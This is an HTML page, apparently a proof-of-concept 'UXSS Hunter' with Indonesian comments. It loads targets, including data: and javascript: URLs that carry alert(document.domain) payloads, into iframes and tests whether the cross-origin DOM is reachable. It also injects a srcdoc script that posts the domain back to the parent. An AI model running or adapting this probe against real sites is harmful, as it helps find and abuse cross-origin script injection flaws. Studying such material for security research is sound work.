<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>UXSS Hunter</title>
  <style>
    body {
      font-family: monospace;
      background: #111;
      color: #0f0;
      padding: 20px;
    }
    h2 {
      margin-bottom: 10px;
    }
    iframe {
      width: 400px;
      height: 200px;
      border: 1px solid #555;
      margin: 5px 0;
      display: block;
    }
    .log {
      background: #000;
      padding: 10px;
      border: 1px solid #444;
      max-height: 300px;
      overflow-y: auto;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h2>üïµÔ∏è UXSS Hunter PoC</h2>
  <div id="log" class="log"></div>

  <script>
    function log(msg) {
      const logBox = document.getElementById("log");
      logBox.textContent += msg + "\n";
      logBox.scrollTop = logBox.scrollHeight;
      console.log(msg);
    }

    // List target untuk fuzz
    const targets = [
      "https://example.com", // ganti ke target asli
      "about:blank",
      "data:text/html,<script>alert(document.domain)</script>",
      "javascript:alert(document.domain)"
    ];

    // Load target dalam iframe & test akses
    targets.forEach(url => {
      try {
        const f = document.createElement("iframe");
        f.src = url;
        document.body.appendChild(f);

        log("üîó Loaded: " + url);

        setTimeout(() => {
          try {
            const dom = f.contentWindow.document;
            log("‚ùó [Possible UXSS] Bisa akses DOM iframe: " + url + " ‚Üí domain: " + dom.domain);
          } catch (e) {
            log("‚úÖ [Isolated] Tidak bisa akses iframe: " + url);
          }
        }, 2000);

      } catch (e) {
        log("‚ùå Error load: " + url + " ‚Üí " + e);
      }
    });

    // Test srcdoc injection
    const s = document.createElement("iframe");
    s.srcdoc = `
      <script>
        parent.postMessage('[srcdoc executed] domain=' + document.domain, '*')
      </script>
    `;
    document.body.appendChild(s);

    window.addEventListener("message", e => {
      log("üì© Message dari iframe: " + e.data);
    });
  </script>
</body>
</html>
